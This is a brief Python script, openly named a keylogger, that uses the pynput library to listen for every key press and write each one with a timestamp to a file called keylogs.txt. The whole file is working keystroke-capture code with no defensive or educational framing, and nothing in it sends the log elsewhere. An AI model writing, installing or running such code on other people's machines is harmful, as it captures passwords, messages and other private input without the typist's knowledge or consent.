from pynput import keyboard
import logging

log_dir = "keylogger/"

logging.basicConfig(filename=(log_dir + "keylogs.txt"), level=logging.DEBUG, format="%(asctime)s:%(message)s")

def keypress(key):
    try:
        logging.info(str(key))
    except AttributeError:
        print("A special key {0} has been pressed.".format(key))



with keyboard.Listener(on_press=keypress) as listener:
    listener.join()
